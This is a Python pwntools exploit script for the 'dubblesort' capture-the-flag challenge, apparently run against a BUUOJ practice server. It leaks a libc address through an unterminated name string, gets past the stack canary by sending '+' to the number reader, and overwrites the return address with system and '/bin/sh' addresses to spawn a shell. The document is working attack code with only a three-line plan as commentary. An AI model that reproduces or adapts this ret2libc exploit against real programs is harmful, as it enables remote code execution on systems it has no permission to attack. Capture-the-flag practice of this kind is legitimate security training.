'''
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled

1. leak libc address by string printf
2. bypass canary by array logic vuln 
3. ret2libc to get shell 
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", 26056
filename = "./dubblesort"
elf = ELF(filename)
local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc.so.6'
remote_libc = './ubuntu16-libc-2.23-x86.so'
libc = ELF(local_libc if local else remote_libc)
# context(arch="amd64", os="linux")
context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    payload = b'f' * 0x18
    io.sendlineafter("What your name :", payload)
    io.recvuntil(b'f' * 0x18)
    libc.address = u32(io.recv(4)) - 0x1B0000 - 0xA
    system_addr = libc.sym['system']
    binsh_addr = next(libc.search(b"/bin/sh\x00"))
    log.success("libc.address: " + hex(libc.address))
    log.success("system_addr: " + hex(system_addr))
    log.success("binsh_addr: " + hex(binsh_addr))

    io.sendlineafter(b':', '35')
    for i in range(24):
        io.sendlineafter(b': ', '1')
    
    io.sendlineafter(b': ', '+')
    for i in range(9):
        io.sendlineafter(b': ', str(system_addr))
    
    io.sendlineafter(b': ', str(binsh_addr))


if __name__ == "__main__":
    pwn()
    io.interactive()
